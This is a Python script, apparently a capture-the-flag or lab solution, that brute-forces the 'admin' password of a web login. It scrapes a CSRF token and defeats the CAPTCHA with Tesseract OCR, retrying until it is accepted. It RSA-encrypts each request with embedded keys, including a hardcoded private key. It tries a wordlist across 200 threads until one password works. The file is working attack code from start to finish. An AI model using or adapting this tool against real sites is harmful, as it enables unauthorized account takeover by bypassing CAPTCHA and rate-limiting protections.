from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from urllib.parse import urlencode
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
from PIL import Image
import base64
import requests
import sys
import pytesseract
import string
import random
import concurrent.futures



serverPublicKey = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt38SAt9XfLRClH+41yxl
NIEOrHcZjGjrZZVV/R/XcuFJI2bBInWrmcnrQguajtO1tehWrdSCto+kP6wI2NyR
qL8tpuovK6SO1KT+TpkceeZyJIN+QGnp19pbLeDG3xZXK94AKxB0xH59DWHWcHNs
ktLz3RnW4xX+YI3o5hn/fcgPrxQ6kK4jYPm0xtbIYtcc86zH9+Cv6R+Y0rwfAXtG
0+YAJDYYRo0Aro1uV2zCG/9Khy/Dxrvm3Qc4OAidZsoS6dFv+0/Hp3UxF8FfAExw
Iwfx6YKfiC4xpGuDlxkyuP90L9T0Ke8KPfKhAqc5+aHE0EqYkXDRQQVrF5fmjdRk
LwIDAQAB
-----END PUBLIC KEY-----
"""

clientPrivateKey = """
-----BEGIN PRIVATE KEY-----
MIIEuwIBADANBgkqhkiG9w0BAQEFAASCBKUwggShAgEAAoIBAQC1DwWR7yGlsNpg
YaBHWheqnLoZvGuSr3MWcZyoHrql5iwzzOolmu00WwaGiuOwPyl4GjRCR4rwXpGq
sMJiYuwOG6w9gPzIDg1Y11cPtkqzxZ20kX/8DFFlGiurwAK6SOkrtfhLYF56YDJg
WS7lVwtVq5LstdzSeTEtvSFdhNedUZW8l319AYJGjByXwNMUW3u21wGff8hDN8Yu
AMrciW1UJFO2aN39v8Vev1VrAvRItFK1znCq0eNRJKjruEztXO/vZzR8Lc0BA0Uj
OyIizkEQKBx5/OTRf8rqO5CkqcLcr/f0u4ZlH6cJg9jOVJlTeb37S94d3uSx+4Pb
EIw+/Hm7AgMBAAECgf8ICgCTLWjRDCLINdG9WUs8P4YD0bfB1BmDy/8PEYFrQrNv
dzrMG1CgHBU2n9HztJX4HQ+bWTyFPHp/iJ3lr1yYmRlqkJxkZ7LJnOg4KD3CeWGg
zX+2l6I4wV+mfE74B4j9gXTAjrGBEtVuC1R4pykEV/e/JHYpjOKqpTsi0kMm9LH5
a3eiLKtP+zAL+s7DEQopALi2oEq5/0+hJxZVYUX0P6q+A/o5kdheXeWjEuL9nUDR
YM/bcnAOKTE9B7+sZ5SUGDwf6L+MpTBLN7rnNvli6mykmvYwCeFYOKAVXjcFWRg1
3kR0yVxkpPBXC97CZyRsYiRHiYEzRKZo5eHRhHkCgYEA7nPGUNhHtXeT5oIurZgJ
K/FePMzgBxbDXtbAHEpw378Y90BjUUB7YxAZxhiTO1wKsAWhr1VQOdWmqlTrhurN
/XGxrpMuDRuNkYbXjjvmv4SpdgW5YnXR9BA1bjwWbuEoqsLu//oNySrbLVlYP2he
Q3rXeCN2BZDStte2D6VrQukCgYEAwmIBCOjaBWh8VnxnoSsSdjUf1/oXAIzKpEwO
waZadwsqau3ITARGjz0cMuV8s7gXAU6fskXqIMvaAxvr1/GXfoIGTSuSwNRW0MKI
k26HK++R7TPISLXC1PpF33z+uBRi6wiYeRsG+Jo5l4pW9fD4KBSFs2P9H5njWeW+
hH0MiQMCgYEAzCJvD3zoftDc3ARsw44Zo/XhUDmwPEFfhgxgsJeF4/ZsABeuLrv+
JYN+HRmiybl1KNXZYgmuQaTHJqDGdV0EdclkbGhxjyUcYA5I8OoVE7YVgQVLfKAS
2lcZ9sIYDlpRf0acZqWCMcqvkjYfl0DZGfnLBn2NJxyhV4h5wxFBLykCgYAJ9zxW
WJnU7SZyyK4HdU3dAZxAVnIXdSBui/e1tfGtaMUj9kzumMmFTnzDn0Bldmq3hnBp
k2wNgmYLAsN0rs41jjUEf9dmS3yn91FJPcFwXzf8EUuTbr4ubSZn7uCgT2tC4Y3v
p5MT69RIEK+krFYMuACi0d2IYTtmwICkCkU6QQKBgGlXG0c681f1lYVAVryEszrO
We9+VRrO3pDiyY348HBdwyyXpn7vfK+fF5C+prDEtO5IQ6v/tdeYfzKVa0iZhIUF
kp2XdXBSHm7ykeY5LYUAjhoShT2Y3gT1oEH5DjqdTA0oJ0DSvbzMchi+uO5e0ZHO
xuASizGvaR+gZ9+ANTmJ
-----END PRIVATE KEY-----
"""

# Load PEM-formatted public key
def import_public_key(pem):
    public_key = serialization.load_pem_public_key(pem.encode())
    return public_key

def import_private_key(priv):
    private_key = serialization.load_pem_private_key(priv.encode(), password=None)
    return private_key

# Encrypt plaintext using the imported public key
def encrypt_data(plain_text, pem_public_key):
    public_key = import_public_key(pem_public_key)
    encrypted = public_key.encrypt(
        plain_text.encode(),
        padding.PKCS1v15()
    )
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data, pem_private_key):
    private_key = import_private_key(pem_private_key)
    encrypted_data = base64.b64decode(encrypted_data)

    # Decrypt using PKCS1v15
    decrypted = private_key.decrypt(
        encrypted_data,
        padding.PKCS1v15()
    )
    # Return as UTF-8 string
    return decrypted.decode()

def send(session, url, token, pwd, captcha, key):
    headers = {
            'Content-Type': 'application/json'
        }
    data = urlencode({
            'action':'login',
            'csrf_token': token,
            'username': 'admin',
            'password': pwd,
            'captcha_input': captcha
        })
    
    #Encrypt data using provided PKI
    data = encrypt_data(data, serverPublicKey)
    response = session.post(f"{url}/server.php", headers=headers, json={"data": data})

    #Decrypt response
    res_json = response.json()
    decrypt = decrypt_data(res_json['data'], clientPrivateKey)
    return decrypt

# Handle Captcha image
def get_captcha(session, url):
    captcha_image = download_captcha(session, f'{url}/captcha.php')
    captcha = solve_captcha(captcha_image)
    return captcha

# Extracting csrf_token
def get_csrf_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf_token'})
    if csrf_input and 'value' in csrf_input.attrs:
        # print("[*] Found csrf token: ", csrf_input['value'])
        return csrf_input['value']
    else:
        raise ValueError("[-] CSRF token not found in HTML")
    

# def generate_captcha():
#     characters = string.ascii_uppercase + string.digits
#     cluster = []
#     for i in range(100):
#         captcha = ''.join(random.choices(characters, k=5))
#         if captcha not in cluster:
#             cluster.append(captcha)
#     return cluster

def download_captcha(session, captcha_url):
    response = session.get(captcha_url, stream=True)
    if response.status_code == 200:
        with open('captcha.png', 'wb') as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        # print("\t[*] Downloading CAPTCHA img...")
        return 'captcha.png'
    else:
        raise Exception("[-] Failed to download CAPTCHA.")
    
def solve_captcha(image_path):
    # print("\t[*] Solving CAPTCHA Image...")
    final = ""
    while len(final) < 5:
        image = Image.open(image_path).convert('L')
        threshold = random.randint(180,220)
        image = image.point(lambda p: p > threshold and 255)
        image = image.filter(ImageFilter.SHARPEN)
        captcha_text = pytesseract.image_to_string(
            image,
            config=f'--psm {random.randint(7,13)} --oem 3 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        )
        final = captcha_text.strip().replace(' ', '').upper()
    # print("\t\t[+] TESTING CAPTCHA:", final)
    return final


def login(url, pwd):
    session = requests.Session()
    
    #Extract csrf token
    req = session.get(f"{url}/index.php")
    token = get_csrf_token(req.text)
    captcha = get_captcha(session, url)

    decrypt = send(session, url, token, pwd, captcha, clientPrivateKey)
    while "CAPTCHA" in decrypt:
        # print("\t\t[-] INCORRECT CAPTCHA, retrying...")
        captcha = get_captcha(session, url)
        decrypt = send(session, url, token, pwd, captcha, clientPrivateKey)

    if 'failed' not in decrypt:
        print("[*] FOUND PASSWORD: \t\t\t\t", pwd)
        exit(0)


def main():
    pwdlist = []
    with open(sys.argv[2], 'r') as f:
        lines = f.readlines()
    for line in lines:
        pwdlist.append(line.strip())
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        for pwd in pwdlist:
            executor.submit(login, sys.argv[1], pwd) 

if __name__ == '__main__':
    main()

